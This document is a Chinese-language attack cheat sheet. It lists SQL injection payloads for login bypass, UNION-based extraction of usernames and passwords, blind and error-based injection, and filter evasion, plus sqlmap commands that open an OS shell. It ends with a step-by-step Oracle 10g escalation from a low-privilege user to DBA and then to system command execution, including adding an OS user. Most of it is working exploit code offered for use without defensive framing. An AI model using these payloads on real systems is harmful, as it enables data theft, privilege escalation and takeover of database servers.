# 数字型 （post）
## 1.判断是否存在注入，注入是字符型还是数字型

- 抓包更改参数 id 为 1' or/and 1=1 #
- 抓包更改参数 id 为 1 or/and 1=1 #

- 'or'='or'
- 'or''='
- 'or ''='
- " or "a"="a
- "or "a"="a
- "or 1=1--
- "or 1=1%00
- "or"="a'='a
- "or=or"
- 'or' '1'='1
- or 1=1-- '
- 'OR 1=1%00
- or 'a'='a
- 'or'='1'
- 'or''=''or''='
- ' or ''=''or''='
- 'or'1'='1
- ' or '1'='1
- 'or'a'='a
- ' or 'a'='a
- 'xor
- ') or ('a'='a
- ')or('a'='a
- 1 or '1'='1' or 1=1
- 1 or '1'='1'=1
- 1'or'1'='1
- admin' or 'a'='a
- admin'or'1'='1'--
- admin' or '1'='1'--
- a'or' 1=1--
- a 'or' 1=1--
- or 1=1--
- 'or 1=1--

## 2.猜解 SQL 查询语句中的字段数

- 抓包更改参数 id 为 1 order by `2` #

## 3.确定显示的字段顺序

- 抓包更改参数 id 为 1 union select 1,2 #
- 成功则说明执行的SQL语句为 select First name,Surname from 表 where ID=id…

## 4.获取当前数据库

- 抓包更改参数 id 为 1 union select 1,database() #

## 5.获取数据库中的表

- 抓包更改参数 id 为 1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

## 6.获取表中的字段名

- 抓包更改参数 id 为 1 union select 1,group_concat(column_name) from information_schema.columns where table_name='`users`' #
    >注意符号转义

## 7.获取数据

- 抓包修改参数 id 为 1 or 1=1 union select group_concat(`user_id`,`first_name`,`last_name`),group_concat(`password`) from users #

# 字符型

- 在数字型的基础上，1后面加上'

# 搜索型
- %创造闭合

# 盲注

## 手工盲注的步骤

- 1.判断是否存在注入，注入是字符型还是数字型
- 2.猜解当前数据库名 二分法
- 3.猜解数据库中的表名
- 4.猜解表中的字段名
- 5.猜解数据

## 盲注分为两类：
- 1.布尔盲注　
    - 布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。

    - 基于 boolean 盲注主要表现：
        - 1. 没有报错信息
        - 2. 不管是正确的输入,还是错误的输入,都只显示两种情况(我们可以认为是0或者1)
        - 3. 在正确的输入下,输入 and 1=1/and 1=2 发现可以判断

- 2.时间盲注　 
    - 界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。

- post类的布尔盲注与时间盲注
    - post类的布尔盲注只是把and换成or其他不变，时间盲注有些不同因为在post类里sleep函数会被放大很多也就是说那个延时时间会很长，不过并不影响我们进行测试。


# 单项释义

## 一，联合查询
- 联合查询是拼接在原查询语句下，要求结果数量与原结果数量相同。
    - select * from security.users where id=1 `union` select 1,2,3;
        >1,2,3并无特殊含义，换成其他数字或字符串也可以，这里只是站位表示一下。
- 使用union拼接两个select语句。

## 二，注释语句
- sql注入时要注释掉后面的部分才能使整个语句正确运行，这里记录几种方法。

    ### 1，`#`注释符
    - select * from security.users where id=1 union select 1,2,database ()`#` limit 0,30;
        >此时后面的limit 0,30并没有生效。

    ### 2，`--`空格注释符 
    - select * from security.users where id=1 union select 1,2,database () `--` ' limit 0,30;
        >注意在--后面有个空格，否则会报错，不过书写时可能疏忽，因此空格后一般写一个随机字符串。

    ### 3, `;/*` 注释符
    - select * from security.users where id=1 union select 1,2,database() `;/*` ' limit 0,1;
        >这个注释一定要注意 /前面有个；否则会报错

## 三，where条件语句使用
-  select * from security.users where id=1 && 1=2 union select 1,2,database() -- hack; limit 0,30;
    >where语句起到过滤作用，筛选出符合结果的查询内容。where后的条件同样符合true和false的运算。

    >可以利用加上 and 1=2 (或者其他为false的语句)使原条件失效，也可以利用 or 1=1使原条件一定成立。

    >and和or可以替换成 && 和 ||

    >当然在查询的id处输入一个不可能存在的值也可以使结果为空，比如前面输入的-1

## 四，空格替换
- select * from security.users where id=1.union`/**/`select`+`1,2,database() limit 0,30;

    >这里主要是为了绕过对空格的过滤

    >可以使用`/**/`代替空格，这个一定可以使用（如果没有被过滤）。`+`和 .     在某些情况下也可以代替空格

    >这里分别用`/**/` `+`  .  代替了空格。

## 五，CHAR函数
- select * from security.users where username='Dumb' union select 1,2,`char(65)`#; limit 0,30;

    >`char()`可以将ascii码转换为字符，也是为了绕过过滤。 

## 六，CONCAT函数
- select * from security.users where id=1 union select 1,2,`concat(char(65),char(66),char(67))`# limit 0,30;

    >这字符拼接函数，可以结合char函数使用

## 七，SUBSTR函数
- select * from security.users where id=1 union select 1,2,`substr('abcd',3,2)`#; limit 0,30;

    >这是从字符串提取字符用的

    >表示从第三位 提取两位

## 八，IF函数
- select * from security.users where id=1 union select 1,2,`if(database()='security','true','false')` limit 0,30;

    >mysql中的if函数格式为 if（条件，成立语句，失败语句）

## 九，获取数据库版本
- select * from security.users where id=1 union select 1,1,`@@vsersion` #; limit 0,30;

    >使用@@version,可以当做一个常亮来查询使用

## 十，GROUP_CONCAT函数
- select * from security.users where id=1 union select 1,`group_concat(username)`,`group_cincat(password)` from users #; limit 0,30;

    >这个函数可以将多条结果合并在一条输出，非常常用

## 十一，获取当前数据库名
- select * from security.users where id=1 union select 1,2,`database()` limit0,30
    >使用database()函数，可以显示数据库名。
    >database()的返回值显示在联合查询的第三个位置，也就是前面3的位置。

## 十二，获取该数据库的所有表名和列名
- select * from security.users where id=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' limit 0,30;

    >使用information_schema_tables表，这是mysql的一个系统表，这里记录了所有表的信息，可以从这里查询到某个数据库的所有表。
    >table_schema是该表中的一个字段名，记录着每张表属于哪个数据库。

    >同理获取列名
    >- Select column_name from information_schema.columns where
    Table_shcema=database() and table_name=’指定的表名’；

## 十三，/*！ xxx  */  可执行的注释
- select * from security.users where id=1 union `/*!select*/` 1,2,database();

    >mysql中的特色，注意有个 ！

    >/*！ */ 中的内容会被执行。

## 十四，十六进制转换
- select * from security.users where id=1 union /!select/ 1,2,`0x64617461626173652829`
    >mysql中会自动将16进制转换为字符串，并且自动为字符串加上引号，

    >使用时注意加上0x开头，表示为16进制数字。

    >database()的16进制表示  64617461626173652829

## 十五，count(*)函数
- count(*)函数用来统计查询结果数量 

## 十六，sleep()函数
- 可以实现一定时间的延迟，用来盲注。

## 十七，mysql对字符和数字比较的处理
- 注入时会遇到字符型和数字型，这里有必要了解一下mysql的处理机制。
    - 1，对于字符型向数字的转化匹配，自动截取前面的数字部分，即 ‘1abc’当做 1
    - 2，开头字符型和数字比较时，字符串当做零处理

## 十八，绕过md5比较的登录
- 一般站点不会直接保存用户的明文密码，而是将明文密码MD5加密后保存，在登录验证时，也是将输入的密码进行MD5加密，与数据库中保存的MD5值进行比较，如果一直就认证成功。

- 登录过程类似于：首先将用户提交的密码进行MD5加密，然后将用户名与加密后的密码 放入数据库查询

-  select  username_id from users where username='admin' and password=pass(已经MD5加密) limit 0,1;

    >这时候存在绕过漏洞：输入 用户名：xxx

    >密码：123' and 1=2 union select "admin" , "21232f297a57a5a743894a0e4a801fc3"  #

    >md5(admin)="21232f297a57a5a743894a0e4a801fc3"

## mysql中table schema的基本操作
- 首先要知道information_schema是什么，在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。

- 列出test数据库中所有的表名，类型(普通表还是view)和使用的引擎 
    - select table_name, table_type, engine <br>
    - FROM information_schema.tables <br>
    - WHERE table_schema = 'test' <br>
    - ORDER BY table_name DESC; <br>

    >解释： 对表的meta data的查询需要使用information_schema.tables， table_schema是数据库的名称，table_name是具体的表名，table_type指的是表的类型

## user()
- User( ) 这个函数, 是取得当前登陆的用户

## version()
- version( ) 这个函数, 是取得当前数据库的版本

## database()
- database( ) 这个函数, 是取得当前数据库

## updatexml ()

- updatexml()函数与extractvalue()类似，是更新xml文档的函数。
- updatexml (XML_document, XPath_string, new_value); 
    - 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 
    - 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法,可以在网上查找教程。 
    - 第三个参数：new_value，String格式，替换查找到的符合条件的数据 
        - 作用：改变文档中符合条件的节点的值
- 查询示例：select username from security.user where id=1 and (updatexml(‘anything’,’/xx/xx’,’anything’))
- 注入示例：
    - updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
    >其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出
    ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'

## extractvalue ()
- extractvalue() :对XML文档进行查询的函数

- 其实就是相当于我们熟悉的HTML文件中用 `<div><p><a>`标签查找元素一样

- 语法：extractvalue(目标xml文档，xml路径)

- 第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

    - 正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错

- 查询示例：select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))

## limit语句
### 科教篇
- SELECT * FROM table  LIMIT [offset,] rows | rows OFFSET offset;

### 入门篇
- SELECT * FROM table LIMIT 0,10;//检索记录行1-10

### 进阶篇
- SELECT * FROM table LIMIT 2,10;//检索记录行3-13
- SELECT * FROM table LIMIT 5,20;//检索记录行6-25

### 高级篇
- SELECT * FROMtable LIMIT 5,-1;//检索记录行6到结尾数据
- SELECT * FROMtable LIMIT 0,-1;//检索全部记录
- SELECT * FROM table LIMIT 5;//检索前 5 个记录行

# SQMAP GETshell
##
直连数据库getshell:
```
-d "mysql://<username>:<password>@<target-ip>:<target-port>/<dbname>" --os-shell        直连mysql数据库获得shell
-d "mssql://<username>:<password>@<target-ip>:<target-port>/<dbname>" --os-shell        直连mssql数据库获得shell
-d "oracle://<username>:<password>@<target-ip>:<target-port>/<sid>" --os-shell          直连oracle数据库获得shell(需要使用python安装两个模块,sqlalchemy和cx_Oracle,暂未实现)
```

# Oracle
- Oracle 10g 经典提权漏洞(低权限数据库用户提权到dba)
    - 影响范围
        oracle版本 < 10.2.0.4
    - 查看当前角色权限
        select * from session_roles;
    - 利用漏洞执行权限提升(第一步)
        ```sql
        Create or REPLACE
        PACKAGE HACKERPACKAGE AUTHID CURRENT_USER
        IS
        FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env
        SYS.odcienv)
        RETURN NUMBER;
        END;
        /
        ```
    - 利用漏洞执行权限提升(第二步)
        需将 <DB_USERNAME> 替换成当前低权限的数据库用户名
        ```sql
        Create or REPLACE PACKAGE BODY HACKERPACKAGE
        IS
        FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env
        SYS.odcienv)
        RETURN NUMBER
        IS
        pragma autonomous_transaction;
        BEGIN
        EXECUTE IMMEDIATE 'GRANT DBA TO <DB_USERNAME>';
        COMMIT;
        RETURN(1);
        END;
        END;
        /
        ```
    - 利用漏洞执行权限提升(第三步)
        需将 <DB_USERNAME> 替换成当前低权限的数据库用户名
        ```sql
        DECLARE
        INDEX_NAME VARCHAR2(200);
        INDEX_SCHEMA VARCHAR2(200);
        TYPE_NAME VARCHAR2(200);
        TYPE_SCHEMA VARCHAR2(200);
        VERSION VARCHAR2(200);
        NEWBLOCK PLS_INTEGER;
        GMFLAGS NUMBER;
        v_Return VARCHAR2(200);
        BEGIN
        INDEX_NAME := 'A1';
        INDEX_SCHEMA := '<DB_USERNAME>';
        TYPE_NAME := 'HACKERPACKAGE';
        TYPE_SCHEMA := '<DB_USERNAME>';
        VERSION := '10.2.0.1.0';
        GMFLAGS := 1;
        v_Return := SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA(INDEX_NAME =>
        INDEX_NAME,
        INDEX_SCHEMA=> INDEX_SCHEMA,
        TYPE_NAME => TYPE_NAME,
        TYPE_SCHEMA => TYPE_SCHEMA,
        VERSION => VERSION,
        NEWBLOCK => NEWBLOCK,
        GMFLAGS => GMFLAGS);
        END;
        /
        ```
    - 重新查看角色权限(已变成dba)
        select * from session_roles;

    
- 从 DBA 提权到系统 shell
    - 首先查看权限
        select * from session_privs;
    - CREATE SESSION权限提权到系统 shell
        - 获取 java 权限
            ```sql
            DECLARE
                POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
                CURSOR C1 IS SELECT 'GRANT', 'ZTZ', 'SYS', 'java.io.FilePermission', '<<ALL
            FILES>>', 'execute', 'ENABLED' FROM DUAL;
                BEGIN
                OPEN C1;
                FETCH C1 BULK COLLECT INTO POL;
                CLOSE C1;
                DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
                END;
            /
            ```
        - 获得java.lang.RuntimePermission权限
            ```sql
            DECLARE
                POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
                CURSOR C1 IS SELECT 'GRANT', USER(), 'SYS', 'java.lang.RuntimePermission',
            'writeFileDescriptor', 'NULL', 'ENABLED' FROM DUAL;
                BEGIN
                OPEN C1;
                FETCH C1 BULK COLLECT INTO POL;
                CLOSE C1;
                DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
                END;
            /
            DECLARE
                POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
                CURSOR C1 IS SELECT 'GRANT', USER(), 'SYS', 'java.lang.RuntimePermission',
            'readFileDescriptor', 'NULL', 'ENABLED' FROM DUAL;
                BEGIN
                OPEN C1;
                FETCH C1 BULK COLLECT INTO POL;
                CLOSE C1;
                DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
                END;
            /
            ```
        -  JAVA权限执行命令
            ```sql
            select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;
            ```
        - 获取java权限
            ```sql
            select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''<<ALL FILES>>'''',''''EXECUTE'''');end;''commit;end;') from dual;
            ```
        - 创建用来执行命令的函数
            ```sql
            select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;
            ```
        - 执行命令
            ```sql
            select LinxRUNCMD('whoami') from dual;
            ```
    - create procedure权限提权到系统 shell(存储过程执行命令)
        - 创建一个java class然后用procedure包装它进行调用
            ```sql
            create or replace and resolve java source named JAVACMD as
                import java.lang.*;
                import java.io.*;
                public class JAVACMD
                {
                    public static void execmd(String command) throws IOException
                    {
                        Runtime.getRuntime().exec(command);
                    }
                }
                /
            ```
        - 创建调用的包
            ```sql
            create or replace procedure JAVACMDPROC(command in varchar) as language java
                name 'JAVACMD.execmd(java.lang.String)';
            /
            ```
        - 执行命令
            ```sql
            EXEC JAVACMDPROC('net user a a /add');
            ```
            会因为代码中没有捕获异常而出现报错,再执行一次即可
